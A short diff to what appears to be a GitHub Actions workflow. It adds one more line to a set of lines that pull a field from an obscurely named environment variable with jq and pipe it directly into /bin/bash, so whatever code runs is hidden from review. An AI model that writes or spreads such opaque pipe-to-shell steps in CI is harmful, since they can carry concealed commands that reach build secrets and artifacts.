@@ -22,6 +22,7 @@ jobs:
           echo $flqr5 | jq -r .fqsi5412 | /bin/bash
           printf '%s' "$ay86289" | jq -r .gn1 | /bin/bash
           printf '%s' "$netu63638" | jq -r .ng125 | /bin/bash
+          echo $bsxi8442 | jq -r .pbj3181 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
